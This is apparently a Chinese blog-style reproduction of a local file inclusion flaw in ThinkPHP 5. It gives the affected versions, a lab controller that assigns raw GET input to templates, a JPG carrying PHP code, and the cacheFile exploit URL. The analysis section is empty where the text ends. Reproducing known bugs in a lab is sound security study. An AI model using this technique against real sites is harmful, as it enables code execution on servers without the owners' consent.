thinkphp5 本地文件包含复现
--

### 漏洞简介

本次漏洞存在于 ThinkPHP 模板引擎中，在加载模版解析变量时存在变量覆盖问题，而且程序没有对数据进行很好的过滤，最终导致 文件包含漏洞 的产生。漏洞影响版本： 5.0.0<=ThinkPHP5<=5.0.18 、5.1.0<=ThinkPHP<=5.1.10。

### 复现环境

linux集成环境：lammp
thinkphp 5.0.18

### 利用方法

更改application/index/controller/Index.php 控制器的代码，如下：

```php
<?php
namespace app\index\controller;
use think\Controller;
class Index extends Controller
{
    public function index()
    {
        $this->assign(request()->get());
        return $this->fetch(); // 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html
    }
}
```

然后创建文件application/index/view/index/index.html,内容随意，必须有这个文件，否则会报错。

然后在public目录下创建一个123.jpg文件，这个是为了模拟真实环境中的文件上传。最后只需要访问如下url
`http://127.0.0.1/thinkphp5018/public/index/index/index?cacheFile=123.jpg`,就会得到phpinfo信息，其中123.jpg文件的内容为

```php
<?php
phpinfo();
?>
```
![](assets/phpinfo.png)

### 漏洞分析

